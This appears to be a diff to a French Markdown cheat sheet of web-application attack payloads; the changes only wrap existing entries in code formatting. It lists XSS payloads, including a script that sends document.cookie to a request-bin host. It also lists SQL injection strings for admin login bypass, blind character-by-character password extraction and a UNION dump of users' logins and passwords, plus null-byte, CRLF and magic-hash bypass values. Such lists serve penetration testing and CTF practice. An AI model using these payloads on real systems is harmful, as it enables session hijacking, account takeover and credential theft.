@@ -1,8 +1,8 @@
 # XSS
 
 - ```<script>alert(1)</script>``` *(le payload de base pour tester si la faille est présente)*
-- &lt;img src=x onerror=alert(1) /&gt; *(une alternative si le mot clef “script” est bloqué)*
-- &lt;script&gt;$.get(“[https://votrerequestbin.com?cookie=”.concat(document.cookie)](https://votrerequestbin.com?cookie=%E2%80%9D.concat%28document.cookie%29 "https://votrerequestbin.com?cookie=%E2%80%9D.concat(document.cookie)"), function(response){ console.log(response);});&lt;/script&gt;
+- ```<img src=x onerror=alert(1) />``` *(une alternative si le mot clef “script” est bloqué)*
+- ```<script>$.get(“[https://votrerequestbin.com?cookie=”.concat(document.cookie)](https://votrerequestbin.com?cookie=%E2%80%9D.concat%28document.cookie%29 "https://votrerequestbin.com?cookie=%E2%80%9D.concat(document.cookie)"), function(response){ console.log(response);});</script>```
 
 **Lien utile :**
 
@@ -14,37 +14,37 @@ Permet d’obtenir un serveur disposant d’une URL accessible sur internet et a
 
 # Injection SQL
 
-- admin';# *(pour essayer de se connecter avec le compte Admin sans renseigner de mots de passe)*
-- admin';--
-- admin";#
-- admin';--
-- ’ OR 1=1;#
-- ’ OR 1=1;/*
-- toto’ OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE login=‘admin’) = ‘a’;# *(puis tester, b, puis c, etc et si le résultat retourne quelque chose, c’est qu’on a trouvé la 1ère lettre, on peut alors passer à la lettre suivante et recommancer.*
-- toto' UNION SELECT login, password FROM users;/* *(s'assurer que la requête initiale remonte 2 colonnes, sinon ajuster le payload selon le nombre de colonnes à remonter via le UNION)*
+- ```admin';#``` *(pour essayer de se connecter avec le compte Admin sans renseigner de mots de passe)*
+- ```admin';--```
+- ```admin";#```
+- ```admin';--```
+- ```’ OR 1=1;#```
+- ```’ OR 1=1;/*```
+- ```toto’ OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE login=‘admin’) = ‘a’;#``` *(puis tester, b, puis c, etc et si le résultat retourne quelque chose, c’est qu’on a trouvé la 1ère lettre, on peut alors passer à la lettre suivante et recommancer.*
+- ```toto' UNION SELECT login, password FROM users;/*``` *(s'assurer que la requête initiale remonte 2 colonnes, sinon ajuster le payload selon le nombre de colonnes à remonter via le UNION)*
 
 # Null Byte (fin de chaîne de caractère)
 
-- %00
-- \\x00
+- ```%00```
+- ```\\x00```
 
 https://www.thehacker.recipes/web/inputs/null-byte-injection
 
 # CRLF (retour à la ligne)
 
-- %0A
-- %0a
-- %0D
-- %0d
-- %0A%0D
-- %0a%0d
+- ```%0A```
+- ```%0a```
+- ```%0D```
+- ```%0d```
+- ```%0A%0D```
+- ```%0a%0d```
 
 # Password payloads (magic hashs)
 
-- \[\] (MD5 & SHA1)
-- 240610708 (MD5)
-- 10932435112 (SHA1)
-- TyNOQHUS (SHA256)
+- ```[]``` (MD5 & SHA1)
+- ```240610708``` (MD5)
+- ```10932435112``` (SHA1)
+- ```TyNOQHUS``` (SHA256)
 
 Lien utile:
 
